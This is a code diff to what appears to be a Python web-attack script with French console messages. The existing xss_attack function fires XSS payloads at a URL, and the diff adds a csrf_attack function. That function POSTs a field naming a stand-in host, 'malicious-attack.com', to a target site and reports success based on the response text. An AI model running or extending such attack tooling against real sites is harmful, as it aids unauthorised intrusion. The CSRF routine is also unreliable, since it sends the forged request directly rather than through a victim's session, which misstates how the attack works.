@@ -129,3 +129,16 @@ def xss_attack(url):
                 print(colored(f"[-] Le payload {payload} ne fonctionne pas.", "red"))
         except requests.exceptions.RequestException as e:
             print(colored(f"[!] Erreur lors de l'attaque XSS : {e}", "red"))
+
+def csrf_attack(url, post_data=None):
+    print(colored("[*] Lancement de l'attaque CSRF...", "yellow"))
+    if post_data is None:
+        post_data = {"target": "http://malicious-attack.com"}  # Payload CSRF simulé
+    try:
+        response = requests.post(url, data=post_data, timeout=10)
+        if "Success" in response.text:  # Ajustez cette condition selon le site
+            print(colored("[+] CSRF attaque réussie!", "green"))
+        else:
+            print(colored("[-] L'attaque CSRF a échoué.", "red"))
+    except requests.exceptions.RequestException as e:
+        print(colored(f"[!] Erreur lors de l'attaque CSRF : {e}", "red"))
